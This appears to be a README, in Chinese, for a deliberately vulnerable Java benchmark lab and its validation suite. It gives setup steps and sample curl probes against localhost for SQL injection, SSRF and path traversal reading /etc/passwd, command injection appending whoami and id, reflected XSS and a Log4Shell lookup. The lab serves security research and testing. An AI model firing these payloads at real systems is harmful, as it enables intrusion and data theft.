# Vulnerability Validation Suite

Qbenchmark Java 漏洞靶场验证测试套件 - 已验证所有漏洞真实可利用。

## 📁 目录结构

```
validation/
├── payloads/                    # 漏洞测试 Payload
│   ├── sqli_payloads.txt       # SQL 注入测试用例
│   ├── ssrf_payloads.txt       # SSRF 测试用例
│   ├── cmd_payloads.txt        # 命令注入测试用例
│   ├── xss_payloads.txt        # XSS 测试用例
│   ├── log4shell_payloads.txt  # Log4Shell 测试用例
│   └── path_traversal_payloads.txt  # 路径遍历测试用例
│
├── quick_validate.sh           # 快速验证脚本
└── README.md                   # 本文件
```

## 🎯 已验证漏洞列表

| 漏洞类型 | 端点示例 | 状态 |
|---------|---------|------|
| SQL Injection | `/sqli/jdbc/vuln` | ✅ 已验证 |
| SSRF | `/ssrf/urlconnection/vuln` | ✅ 已验证 |
| Command Injection | `/cmd/runtime/vuln` | ✅ 已验证 |
| XSS | `/xss/reflect` | ✅ 已验证 |
| Log4Shell | `/log4j/vuln` | ✅ 已验证 |
| Path Traversal | `/path/absolute/vuln` | ✅ 已验证 |

## 🚀 快速开始

### 1. 启动靶场

```bash
cd /opt/projects/benchmark/Qbenchmark/java-vuln-lab
mvn spring-boot:run
```

### 2. 启动 MySQL (用于 SQL 注入测试)

```bash
docker run -d --name mysql-vuln \
  -e MYSQL_ROOT_PASSWORD=password \
  -e MYSQL_DATABASE=vulndb \
  -p 3306:3306 \
  mysql:8.0 --bind-address=0.0.0.0

# 创建测试数据
docker exec mysql-vuln mysql -uroot -ppassword vulndb << 'EOF'
CREATE TABLE users (
    id INT PRIMARY KEY AUTO_INCREMENT,
    username VARCHAR(50) NOT NULL,
    password VARCHAR(100) NOT NULL,
    email VARCHAR(100),
    role VARCHAR(20) DEFAULT 'user'
);
INSERT INTO users (username, password, email, role) VALUES
('admin', 'admin123', 'admin@example.com', 'admin'),
('user1', 'password1', 'user1@example.com', 'user'),
('user2', 'password2', 'user2@example.com', 'user');
EOF
```

### 3. 运行快速验证

```bash
chmod +x /opt/projects/benchmark/Qbenchmark/validation/quick_validate.sh
bash /opt/projects/benchmark/Qbenchmark/validation/quick_validate.sh
```

## 📋 手动验证示例

### SQL Injection

```bash
# 正常请求
curl "http://localhost:8080/sqli/jdbc/vuln?username=admin"

# OR 注入 (应返回所有用户)
curl "http://localhost:8080/sqli/jdbc/vuln?username=admin' OR '1'='1"
```

### SSRF

```bash
# 读取本地文件
curl "http://localhost:8080/ssrf/urlconnection/vuln?url=file:///etc/passwd"
```

### Command Injection

```bash
# Runtime 注入
curl "http://localhost:8080/cmd/runtime/vuln?filename=test.txt;whoami"

# ProcessBuilder 注入
curl "http://localhost:8080/cmd/processbuilder/vuln?dir=/tmp;id"
```

### XSS

```bash
# 反射型 XSS
curl "http://localhost:8080/xss/reflect?vuln=<script>alert(1)</script>"
```

### Log4Shell

```bash
# 环境变量泄露
curl "http://localhost:8080/log4j/vuln?token=\${env:USER}"
```

### Path Traversal

```bash
# 绝对路径
curl "http://localhost:8080/path/absolute/vuln?path=/etc/passwd"
```

## 📄 Payload 文件说明

每个 payload 文件包含：

- 基础测试用例（验证漏洞存在）
- 高级测试用例（绕过技巧）
- WAF 绕过方法
- 验证方法说明

## 🛠️ 技术栈

- **Spring Boot**: 2.7.18
- **Log4j**: 2.14.1 (漏洞版本)
- **MySQL**: 8.0
- **Java**: 1.8+

## ⚠️ 免责声明

本项目仅用于**安全研究和教育目的**。请在合法授权的环境中使用，禁止用于任何非法用途。
